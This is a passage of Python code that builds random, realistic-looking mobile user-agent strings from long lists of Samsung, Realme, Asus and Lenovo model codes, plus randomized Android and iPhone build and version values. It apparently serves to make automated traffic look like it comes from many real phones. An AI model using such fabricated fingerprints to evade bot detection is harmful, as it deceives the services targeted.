'GT-S7710-ORANGE/S7710XXANE3', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'SM-G388F', 'SAMSUNG SM-G388F', 'SM-G389F', 'SM-G390F', 'SM-G390W', 'SM-G398FN', 'SAMSUNG SM-G398FN', 'SM-G525F', 'SM-G525N', 'SAMSUNG SM-G525F', 'SM-G736U1', 'SM-G736B', 'SM-G736W', 'SAMSUNG SM-G736B', 'SM-G889A', 'SM-G715FN', 'SAMSUNG SM-G715FN', 'SM-G715U1', 'SM-G715W', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'gt-s5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360L', 'GT-S5360L', 'GT-S5360L', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'SAMSUNG GT-B5510/B5510XXLE1', 'SAMSUNG GT-B5510/B5510XXLL1', 'GT-B5510', 'GT-B5510L', 'GT-B5510B', 'GT-B5510L', 'GT-B5510', 'GT-B5510', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510-ORANGE/B5510BVLF1', 'GT-B5510-ORANGE/B5510BVLD1', 'GT-B5510-ORANGE/B5510BVLB1', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-B5512B', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-S6310N', 'GT-S6310B', 'GT-S6310N', 'GT-S6310N', 'GT-S6310N-ORANGE/S6310NXXAMK1', 'GT-S6310T', 'GT-S6310T', 'GT-S6310L', 'GT-S6310L', 'GT-S6310L', 'GT-S6310T', 'GT-S6310N', 'GT-S6310L', 'SM-G130H', 'SM-G130HN', 'SM-G130E', 'SM-G130BT', 'SM-G130BU', 'SM-G130BU', 'SM-G130BU', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'SM-F700N', 'U', 'SM-F700U1', 'SM-F7000', 'SM-F700W', 'SM-F711U1', 'SAMSUNG SM-F711B/F711BXXU2CVC7', 'SM-F711N', 'SAMSUNG SM-F711U', 'SM-F721B', 'SM-F721U', 'SAMSUNG SM-F721B', 'SM-F721U1', 'SM-F707B', 'SAMSUNG SM-F707B', 'SM-F707U', 'SM-F7070', 'SM-F707U1', 'SM-F707UZAAXAA', 'SM-F707W', 'SM-F916B', 'SM-F916U', 'SAMSUNG SM-F916B', 'SAMSUNG SM-F916U1', 'SM-F926U', 'SM-F926B', 'SM-F9260', 'SM-F926N', 'SM-F926W', 'SAMSUNG SM-F926B', 'SM-F936U', 'SAMSUNG SM-F936B', 'SM-F936U', 'SM-F936U1', 'SAMSUNG SM-F936W', 'galaxy Z Fold2', 'SAMSUNG SM-Z130H', 'SM-Z200F', 'SM-Z300H', 'SM-Z300H', 'SAMSUNG SM-Z300H', 'Gear Live', 'SM-R750', 'GT-I9060I', 'GT-I9060I', 'Samsung J600GN,telcel,mx', 'SAMSUNG M2004J19C', 'SAMSUNG M2006C3LG', 'SAMSUNG M2102J20SG', 'Samsung M6', 'Samsung N70', 'SAMSUNG N9106', 'SAMSUNG-N9106', 'SAMSUNG-N9106HD', 'GT-I8000', 'SAMSUNG-P9700', 'SAMSUNG S2_PRO', 'SM-G530T1', 'SAMSUNG-T805C', 'SAMSUNG-T805S', 'SAMSUNG-T950S', 'GT-S8500'])
                self.build = (f"{random.choice(['TP1A', 'SP1A', 'QP1A'])}.{random.randrange(210000, 220000)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Realme" in str(self.device):
                self.android_model = random.choice(['RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                self.build = (f"{random.choice(['SP1A', 'RKQ1', 'QP1A'])}.{random.randrange(210000, 220000)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Asus" in str(self.device):
                self.android_model = random.choice(['ME171', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'ME371MG', 'K01N', 'K012', 'K00E', 'K019', 'K00Z', 'K00Z', 'K016', 'K016', 'K00G', 'K00G', 'K50IJ', 'ME172V', 'ME172V', 'ME172V', 'ME172V', 'K00F', 'K01E', 'K00R', 'K017', 'K013', 'K007', 'K01A', 'ASUS MeMO Pad 7', 'K015', 'K011', 'K00L', 'ME302C', 'ME302C', 'ME302C', 'AOSP on Duma', 'ME302KL', 'ME302KL', 'K00U', 'ME173X', 'ME173X', 'ME173X', 'ME173X', 'ASUS K00S', 'ME301T', 'ME301T', 'ME301T', 'PadFone', 'PadFone', 'PadFone 2', 'PadFone 2', 'PadFone T008', 'PadFone T008', 'PadFone T004', 'ASUS_T00E', 'PadFone T00C', 'Padfone t00c', 'PadFone T00C', 'ASUS_T00N', 'ASUS PadFone X', 'ASUS_T00T', 'ASUS_Z01QD', 'ZS600KL', 'ASUS_I001DE', 'ZS660KL', 'ASUS_I001DA', 'ASUS_I001DC', 'ZS660KL', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I005DA', 'ASUS_I005DC', 'ASUS_AI2201_C', 'ASUS_AI2201_D', 'ASUS_AI2201_F', 'ASUS_AI2203_D', 'ASUS_AI2203_C', 'ASUS_AI2203_B', 'ASUS TAB A8', 'Tinker Board', 'Tinker Board 2', 'Tinker Board S', 'TX201LA', 'TX201LA', 'K010', 'K018', 'K018', 'TF300T', 'ASUS Pad TF300T', 'K01B', 'K00C', 'K00C', 'ASUS XPad 10LTE', 'ASUS Z101', 'ASUS Z101 Prime', 'ASUS_Z008D', 'ASUS_Z00AD', 'Z00D', 'ASUS_Z00LD', 'ASUS_Z00ED', 'ASUS_Z00RD', 'ASUS ZenFone 2E', 'ASUS_Z012D', 'ZE520KL', 'ASUS_Z017D', 'ASUS_Z012DA', 'ASUS_Z017DA', 'ASUS_Z012S', 'ASUS_Z012DE', 'ASUS_Z01FD', 'ASUS_Z016S', 'ZS550KL', 'ASUS_Z01BD', 'ASUS_Z01BS', 'ZC551KL', 'ASUS_Z01BDB', 'ASUS_X00DDB', 'ASUS_X008D', 'ASUS_X00DDA', 'ZC553KL', 'ASUS_X008DB', 'ASUS_A001', 'ASUS_Z01HDA', 'ZE553KL', 'ASUS_X00LD', 'ASUS_Z01KDA', 'ASUS_Z01KS', 'ASUS_X00LDB', 'ASUS_T00I', 'ASUS_X00HD', 'ASUS_X00ID', 'ZC554KL', 'ASUS_X015D', 'ASUS_X015D', 'ASUS_Z01GS', 'ASUS_Z01GD', 'ASUS_X00LDA', 'ZD553KL', 'ASUS_Z01MD', 'ASUS_Z01MDA', 'ZD552KL', 'ASUS_X00QD', 'ASUS_X00QD', 'ASUS_T00J', 'ASUS_X00QSA', 'ZE620KL', 'ASUS_T00F', 'ASUS_T00F', 'ASUS_T00K', 'ASUS_X017DA', 'ASUS_T00P', 'ASUS_Z01RD', 'ASUS_Z01RD', 'Zenfone 5Z', 'ZS620KL', 'ASUS_T00G', 'ASUS_I01WD', 'ASUS_T00G', 'ASUS_Z002', 'ZS630KL', 'ASUS_I002D', 'ZS670KS', 'ZS671KS', 'ASUS_I006D', 'ASUS_I004D', 'ASUS_AI2202', 'ASUS_AI2202_B', 'ASUS_A002', 'ASUS_A002A', 'ASUS_Z007', 'ASUS_X00ADA', 'ASUS_X00BD', 'ASUS_X007D', 'ZB500KL', 'ASUS_Z00SD', 'ZB551KL', 'ASUS_L001', 'ZB500KG', 'ASUS_Z00VD', 'ASUS_X013DA', 'ASUS_X013D', 'ASUS_X014D', 'ASUS_X014D', 'ASUS_X013DB', 'G550KL', 'G550KL', 'G553KL', 'ASUS_Z00YD', 'ASUS_A007', 'ASUS_X00RD', 'G552KL', 'ASUS_Z010DD', 'ASUS_Z010DB', 'ASUS_Z010D', 'ASUS_Z010DA', 'ASUS_X00PD', 'ZB555KL', 'ASUS_X01AD', 'ZB633KL', 'ASUS_X018D', 'ASUS_X018DC', 'ASUS_X00TD', 'ASUS_X00TDB', 'ASUS_X00TDE', 'ZB602KL', 'ASUS_X01BDA', 'ASUS_A001D', 'ASUS_X002', 'ASUS_X003', 'ASUS_X003', 'ASUS_X550', 'ASUS_X00GD', 'ASUS_X005', 'ASUS_Z00UDB', 'ASUS_Z00UD', 'ASUS_A006', 'ASUS_A009', 'ASUS_Z00XS', 'P01T_1', 'P021', 'P00L', 'P00C', 'P028', 'P027', 'ASUS_P00I', 'P001', 'P008', 'ASUS_P00J', 'ASUS ZenWatch', 'ASUS ZenWatch 2'])
                self.build = (f"{random.choice(['SKQ1', 'OPR1'])}.{random.randrange(0000000, 999999)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Lenovo" in str(self.device):
                self.android_model = random.choice(['lenovo1023', 'Lenovo 1023', 'Lenovo 3056', 'Lenovo 3300A', 'Lenovo 76S', 'Lenovo 8389', 'Lenovo A 319', 'Lenovo A1010a20', 'Lenovo A1000', 'IdeaTabA1000L-F', 'Lenovo A1000', 'Lenovo-A101', 'Lenovo A1900', 'Lenovo A2010l36', 'Lenovo_a2010', 'Lenovo A2010l36/S100', 'Lenovo A2016b31', 'A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2107', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2580', 'Lenovo-A269i/S001', 'id Lenovo_A269i', 'Lenovo A2860', 'Lenovo A288t', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo A308t', 'Lenovo A316', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo_A318t', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A320t', 'Lenovo A328', 'Lenovo A328t', 'Lenovo A328', 'Lenovo A330e', 'Lenovo A330e', 'Lenovo A338T', 'Lenovo A338t', 'Lenovo A355e', 'Lenovo A358t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A368t', 'Lenovo A3690', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'id Lenovo_A369i', 'Lenovo A378t', 'Lenovo A378t', 'Lenovo A3860', 'Lenovo A388t', 'Lenovo A3900', 'Lenovo A3910t30', 'Lenovo A396', 'Lenovo A398t', 'Lenovo A399', 'Lenovo A399', 'Lenovo A399', 'Lenovo A4526', 'L18011', 'Lenovo L18011', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A516', 'Lenovo A516', 'Lenovo A516', 'Lenovo-A516/S111', 'Lenovo A516', 'Lenovo A520/S101', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A529', 'Lenovo A529', 'Lenovo A536', 'Lenovo A536', 'Lenovo A536', 'Lenovo A560', 'Lenovo A560', 'Lenovo A560/JLS36C', 'Lenovo A5600', 'Lenovo A5600', 'LNV-Lenovo_A560e', 'Lenovo A5860', 'LenovoA588t', 'Lenovo A590', 'Lenovo L18081', 'Lenovo L19041', 'Lenovo A6000', 'Lenovo A6000', 'Lenovo A6000 Plus', 'Lenovo A6010', 'Lenovo A6010', 'Lenovo A6010Pro', 'Lenovo A606', 'Lenovo A606', 'Lenovo A616', 'Lenovo A630', 'Lenovo A630/S001', 'Lenovo A630t', 'Lenovo A630t', 'Lenovo A656', 'Lenovo A66/S001', 'Lenovo A660', 'Lenovo A660', 'Lenovo A660', 'Lenovo A6600', 'Lenovo A6600d40', 'Lenovo A6600a40', 'Lenovo A670t', 'Lenovo A680', 'Lenovo A680', 'Lenovo A680_ROW', 'Lenovo A6800', 'Lenovo A688t', 'Lenovo A690', 'Lenovo A690/S001', 'Lenovo L19111', 'Lenovo A7000 Plus', 'Lenovo A7000a', 'Lenovo A706', 'LENOVO A706', 'Lenovo_A706/JZO54K', 'Lenovo A708t', 'Lenovo A750', 'Lenovo A750', 'Lenovo A760', 'Lenovo A760', 'Lenovo_A766/JOP40D', 'Lenovo A768t', 'Lenovo A7700', 'Lenovo A788t', 'Lenovo A788t', 'Lenovo A789', 'lenovo A789', 'LENOVO A789', 'Lenovo L10041', 'Lenovo A800', 'Lenovo A800', 'Lenovo A805e', 'Lenovo A808', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A816', 'Lenovo A816', 'Lenovo A820', 'Lenovo A820', 'Lenovo A820', 'Lenovo_A820', 'lenovoA820c', 'Lenovo A820e', 'Lenovo A820t', 'Lenovo A828t', 'Lenovo A828t', 'Lenovo A830', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'lenovoA850c', 'Lenovo A850i', 'Lenovo A858t', 'LENOVO A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A889', 'Lenovo A889', 'Lenovo A889', 'Lenovo A916', 'Lenovo A916', 'Lenovo_A916', 'Lenovo A916', 'Lenovo A938t', 'Lenovo A2016b30', 'Lenovo K10a40', 'Lenovo D101', 'Lenovo-D101', 'd-42A', 'Lenovo TB-X104F', 'Lenovo TB-X104L', 'Lenovo G756', 'Lenovo A806', 'Lenovo A936', 'Lenovo A936', 'Lenovo_A936', 'Lenovo H75676', 'Lenovo I5', 'Lenovo-I960', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'Ideapad K1', 'Ideapad K1', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-T', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-F', 'IdeaTab A2107A-F', 'IdeaTab A2107A-F', 'IdeaTabA2109A', 'IdeaTabA2109A', 'A2109A', 'IdeaTabA2109A', 'IdeaTabA2207A-H', 'IdeaTab A3000-H', 'IdeaTab A3000-H', 'Lenovo A3000-H', 'Lenovo A3000-H', 'IdeaTabA5000-E', 'IdeaTab_A5000-E', 'Lenovo B8080-H', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2110AH', 'Lenovo S5000-F', 'Lenovo S5000-H', 'Lenovo S5000-H/JDQ39', 'Lenovo S6000-H', 'IdeaTab S6000-H', 'IdeaTab S6000-F', 'ar_AE Lenovo K10', 'Lenovo K10 Note', 'Lenovo L39051', 'Lenovo K10e70', 'Lenovo K10e70', 'Lenovo L38083', 'Lenovo L38082', 'Lenovo K11', 'Lenovo K11 Power', 'Lenovo K12', 'Lenovo XT2081-4', 'Lenovo K12 Note', 'Lenovo K12 Pro', 'Lenovo K13', 'Lenovo K13 Note', 'Lenovo K13 Pro', 'Lenovo K14', 'Lenovo K14 Note', 'Lenovo K14 Plus', 'Lenovo K15 Plus', 'Lenovo K30-W', 'Lenovo K50a40', 'Lenovo K50-t5', 'Lenovo K50-T5', 'K31-t3', 'Lenovo K31-t3', 'Lenovo K320t', 'arm Lenovo K320t', 'Lenovo K32c30', 'Lenovo K32c36', 'Lenovo K32c36', 'Lenovo K33', 'Lenovo K33b37', 'MZ-Lenovo K3note', 'Lenovo K4', 'Lenovo A7010a48', 'K350t', 'Lenovo A7020a48', 'Lenovo A7020a40', 'Lenovo K52e78', 'Lenovo L38012', 'Lenovo L38011', 'en Lenovo L38011', 'Lenovo L38011', 'Lenovo L38041', 'Lenovo K5 Pro', 'Lenovo_K50_T5', 'Lenovo K52t38', 'Lenovo K52t58', 'Lenovo K53', 'Lenovo K53b36', 'Lenovo L38031', 'Lenovo K33b36', 'Lenovo K33a48', 'Lenovo K53a48', 'Lenovo K33a42', 'Lenovo_K33a42', 'lenovoK7', 'Lenovo K8', 'Lenovo K8 Note', 'Lenovo K8 Plus', 'Lenovo K8 Plus', 'Lenovo K80M', 'Lenovo K80M', 'Lenovo_K80M', 'Lenovo K860', 'Lenovo L38043', 'Lenovo L38043', 'Lenovo K900', 'Lenovo K900', 'Lenovo_K900_ROW', 'Lenovo K910', 'Lenovo K910', 'Lenovo K910e', 'Lenovo L79041', 'Lenovo L70081', 'Lenovo L79031', 'Lenovo L79031', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo TB-9707F', 'Lenovo L71061', 'VR-1541F', 'TB-X704A', 'Lenovo TB-X704A', 'Lenovo N300', 'Lenovo N300', 'Lenovo N308', 'Lenovo Note 5', 'lenovo P01k000', 'Lenovo_P1m', 'Lenovo P1m', 'Lenovo P2a42', 'Lenovo P2a42', 'Lenovo P2c72', 'Lenovo P2c72', 'Lenovo P70', 'Lenovo P70', 'Lenovo p70', 'Lenovo P700', 'Lenovo P700i', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P780', 'Lenovo P780', 'Lenovo P780', 'Lenovo P90', 'Lenovo P90', 'Lenovo-P960', 'Lenovo PB1-750M', 'Lenovo PB2-650M', 'Lenovo PB2-670M', 'Lenovo PB1-770M', 'Lenovo S1c58', 'Lenovo S1L a40', 'Lenovo K520', 'Lenovo K520', 'Lenovo L58041', 'Lenovo L58091', 'Lenovo S580', 'Lenovo S580', 'Lenovo S60-a', 'Lenovo S60-a', 'Lenovo S60A', 'Lenovo S650', 'Lenovo S650', 'Lenovo S650', 'Lenovo S658t', 'Lenovo S660', 'LenovoS668T', 'Lenovo S668T', 'Lenovo S668t', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720i', 'Lenovo S720i', 'Lenovo S750', 'lenovo s750', 'Lenovo S750', 'Lenovo S810t', 'Lenovo S820', 'Lenovo S820', 'Lenovo S820', 'lenovo S820c', 'Lenovo S820e', 'Lenovo S850', 'Lenovo S850t', 'Lenovo S856', 'Lenovo S858t', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860/JDQ39', 'LNV-Lenovo S870e', 'Lenovo S880', 'Lenovo S880', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo-S890/S100', 'Lenovo S898t', 'Lenovo S898t /V1.5', 'Lenovo s898t', 'Lenovo S90A', 'LenovoS90C', 'Lenovo S920', 'Lenovo S920', 'Lenovo S920/V1.5', 'Lenovo S930', 'Lenovo S938t', 'Lenovo S939', 'Lenovo S939', 'Lenovo S960', 'Lenovo S960', 'Lenovo TB-8505FS', 'Lenovo TB-8505XS', 'Lenovo TAB 2 A10-70L', 'Lenovo TAB 2 A7-30HC', 'Lenovo TAB 2 A7-30DC', 'Lenovo TAB 2 A7-30GC', 'Lenovo TB-8504F', 'Lenovo TB-8704F', 'A101LV', 'Lenovo TB-7504X', 'Lenovo TB-7504X', 'Lenovo TB-7304X', 'Lenovo TB-7304I', 'Lenovo TB-7304F', 'Lenovo TB-7104F', 'Lenovo TB-7104I', 'Lenovo TB-8304F1', 'Lenovo TB-8304F1', 'Lenovo TB-X6C6F', 'Lenovo TB-X6C6X', 'Lenovo TB-J606N', 'Lenovo TB-J607Z', 'Lenovo TB-X505F', 'Lenovo TB-X505X', 'Lenovo TB-X505L', 'Lenovo TB-X605F', 'TB328FU', 'TB328XU', 'Lenovo TB-X605L', 'Lenovo TB-X605M', 'Lenovo TB-X606XA', 'Lenovo TB-X606F', 'Lenovo TB-X605LC', 'Lenovo TB-X605FC', 'Lenovo TB-X306FA', 'Lenovo TB-X306X', 'Lenovo TB125FU', 'Lenovo TB128XU', 'TB128FU', 'Lenovo TB-7305X', 'Lenovo TB-7305X', 'Lenovo TB-7305F', 'Lenovo TB-7305I', 'Lenovo TB-7306F', 'Lenovo TB-7306X', 'Lenovo TB-8506F', 'Lenovo TB-8506FS', 'Lenovo TB-8506X', 'Lenovo TB-8705F', 'Lenovo TB-X705L', 'Lenovo TB-X705F', 'Lenovo TB-J606F', 'Lenovo TB-J606L', 'TB350FU', 'Lenovo TB-J616F', 'Lenovo TB-J616X', 'Lenovo TB-J706F', 'Lenovo TB-J706L', 'TB132FU', 'Lenovo TB-Q706F', 'Lenovo TB-Q706Z', 'Lenovo TB-J607F', 'Lenovo PB-6505M', 'Lenovo PB-6505Y', 'Lenovo TB3-X70F', 'Lenovo TB3-X70L', 'Lenovo TB3-730X', 'Lenovo TB3-710I', 'Lenovo TB3-710F', 'Lenovo TB-7703X', '601LV', 'Lenovo TB3-850M', 'Lenovo TB3-850F', '602LV', 'Lenovo TB-8703X', 'Lenovo TB-8703F', 'Lenovo TB-X304L', 'Lenovo TB-X304F', 'Lenovo TB-X704L', 'Lenovo TB-X704F', '701LV', 'Lenovo TB-8504X', 'Lenovo TB-8704X', 'Lenovo TB-8X04F', 'Lenovo TB350XU', 'Lenovo ThinkPad 13', 'ThinkPadTablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'Lenovo A1000m', 'Lenovo vibe a plus', 'Lenovo A2016a40', 'Lenovo A2016a40', 'Lenovo A2020a40', 'VIBE C', 'Lenovo A6020a41', 'Lenovo A6020l36', 'Lenovo A6020a40', 'Lenovo A6020l37', 'Lenovo A6020a46', 'Vibe K5 Plus', 'Lenovo P1a42', 'Lenovo P1c58', 'Lenovo P1a41', 'Vibe P1 Turbo', 'Lenovo P1ma40', 'Lenovo S1c50', 'Lenovo S1a40', 'Lenovo S1La40', 'VIBE_S2i', 'VIBE S3i', 'VIBE S5i', 'VIBE S6i', 'VIBE S6i Plus', 'VIBE S7i', 'Lenovo Z90a40', 'Lenovo Z90-7', 'VIBE V7', 'Lenovo X2-AP', 'Lenovo X2-TO', 'Lenovo X2-TO', 'Lenovo X3c70', 'Lenovo X3c50', 'Lenovo X3a40', 'Lenovo K51c78', 'Lenovo K51c78', 'Lenovo X3 Lite', 'Lenovo K910L', 'Lenovo K910L', 'Lenovo Vibe Z2', 'Lenovo K920', 'Lenovo X2-EU', 'Lenovo X2-EU', 'lenovo x606fa', 'TB138FC', 'Lenovo YT3-X90X', 'Lenovo YT3-X90L', 'Lenovo YT3-X90F', 'Lenovo YB-Q501F', 'Lenovo YB1-X90F', 'Lenovo YB1-X90L', 'Lenovo YT-K606F', 'Lenovo YT-X705L', 'Lenovo YT-X705X', 'Lenovo YT-X705F', 'Lenovo YT-J706F', 'Lenovo YT-J706X', 'Lenovo YT3-X50F', 'Lenovo YT3-X50L', 'Lenovo YT3-X50M', 'Lenovo YT3-850M', 'Lenovo YT3-850M', 'Lenovo YT3-850F', 'Lenovo YT3-850L', 'Lenovo YT-X703F', 'Lenovo YT-X703L', 'Lenovo B8000-H', 'Lenovo B8000-F', 'Yoga Tablet 2', 'Lenovo B6000-F/JDQ39', 'Lenovo B6000-HV', 'Lenovo Z2', 'Lenovo Z2', 'Z2 Plus', 'Lenovo Z2w', 'Lenovo L78011', 'Lenovo L78031', 'Lenovo Z5 Pro', 'Lenovo L78032', 'Lenovo L78071', 'Lenovo L78071', 'Lenovo Z5s', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo Z6 Lite', 'Lenovo L78051', 'Lenovo L38111', 'ZUK Z2151', 'ZUK Z2151', 'ZUK Z1', 'ZUK Z2132', 'ZUK Z2132', 'ZUK Z2131', 'ZUK Z2121'])
                self.build = (f"{random.choice(['PKQ1', 'SKQ1', 'SP1A', 'RP1A'])}.{random.randrange(0000000, 999999)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Iphone" in str(self.device):
                self.iphone_version = random.choice(['16_2', '15_7', '15_1', '16_5', '16_3', '15_6', '15_0', '16_1_2', '9_3_5', '16_1_2', '15_5', '16_4_1'])
                self.CriOS_version = (f"{random.randrange(88, 262)}.0.{random.randint(00000000, 99999999)}")
                self.useragent = (f'Mozilla/5.0 (iPhone; CPU iPhone OS {self.iphone_version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{self.CriOS_version} Mobile/15E148 Safari/604.1')
            elif "Oneplus" in str(self.device):
